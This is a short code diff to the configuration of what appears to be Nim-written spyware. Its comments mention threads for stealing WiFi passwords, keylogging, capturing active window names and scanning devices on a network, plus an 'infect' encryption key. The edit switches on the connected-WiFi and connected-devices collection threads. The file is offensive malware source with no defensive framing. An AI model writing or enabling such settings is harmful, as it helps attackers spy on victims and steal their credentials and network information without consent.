@@ -63,7 +63,7 @@ const USE_WIFI_PASSWORDS_THREAD*: bool = false
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
 ## DEFAULT: true
-const USE_CONNECTED_WIFI_THREAD*: bool = false
+const USE_CONNECTED_WIFI_THREAD*: bool = true
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
@@ -131,7 +131,7 @@ const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"
 ## connectedDevicesThread is used for getting all the connected
 ## devices on a wifi network
 ## DEFAULT: true
-const USE_CONNECTED_DEVICES_THREAD*: bool = false
+const USE_CONNECTED_DEVICES_THREAD*: bool = true
 
 ## the number of threads connectedDevicesThread will use
 ## to check ips
